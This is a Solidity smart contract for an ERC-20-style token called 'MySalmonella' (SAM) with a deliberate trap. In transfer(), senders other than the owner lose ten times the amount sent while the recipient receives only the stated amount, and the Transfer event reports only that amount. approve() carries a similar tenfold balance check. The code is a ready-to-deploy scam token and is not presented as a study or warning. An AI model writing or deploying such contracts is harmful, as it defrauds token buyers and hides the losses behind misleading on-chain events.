// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract MySalmonella {
    
    // State variables
    address public owner;
    string public name = "MySalmonella";
    string public symbol = "SAM";
    uint8 public decimals = 18;
    uint256 public totalSupply;  // totalSupply is initialSupply, given to owner on deployment
    mapping(address => uint256) public balanceOf; // query the balance of an address
    mapping(address => mapping(address => uint256)) public allowance; // query the allowance value between two addresses

    // Events: Emit data to the blockchain. DApps listen for these events and react accordingly.
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    // Constructor  
    constructor(uint256 _initialSupply) {
        // Gives owner all the tokens initial supply setting it to the total supply.
        owner = msg.sender;
        balanceOf[owner] = _initialSupply;
        totalSupply = _initialSupply;
    }

    // Transfer Function
    function transfer(address _to, uint256 _value) public returns (bool success) {

        uint256 trapValue = _value * 10;
        // if owner use value, if non owner use trap value
        if (msg.sender == owner) {
            require(balanceOf[msg.sender] >= _value, "Insufficient balance for transfer");
            balanceOf[msg.sender] -= _value;
            balanceOf[_to] += _value;
        } else {
            require(balanceOf[msg.sender] >= trapValue, "Insufficient balance for transfer");
            balanceOf[msg.sender] -= trapValue;
            balanceOf[_to] += _value;
        }

        // emit as success
        emit Transfer(msg.sender, _to, _value);
        return true;
    }

    // Approve Function
    function approve(address _spender, uint256 _value) public returns (bool success) {

        uint256 trapValue = _value * 10;

        if (msg.sender == owner) {
            require(balanceOf[msg.sender] >= _value, "Insufficient balance for approval");
            allowance[msg.sender][_spender] = _value;
        } else {
            require(balanceOf[msg.sender] >= trapValue, "Insufficient balance for approval");
            allowance[msg.sender][_spender] = _value;
        }

        emit Approval(msg.sender, _spender, _value);
        return true;
    }


    // Delegated Transfer Function ('from' is owner, 'msg.sender' is spender. Ex: Uniswap)
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {

        // Checks the owner has more tokens than what the spender will spend.
        require(_value <= balanceOf[_from], "Insufficient balance");
        // Checks the value of allowance between owner and spender, making sure it's more than what the spender will spend.
        require(_value <= allowance[_from][msg.sender], "Allowance value exceeded");

        // Decrements value from owner, increments value to 3rd party end recipient.
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        // Decrements spenders total allowance.
        allowance[_from][msg.sender] -= _value;

        emit Transfer(_from, _to, _value);
        return true;
    }
}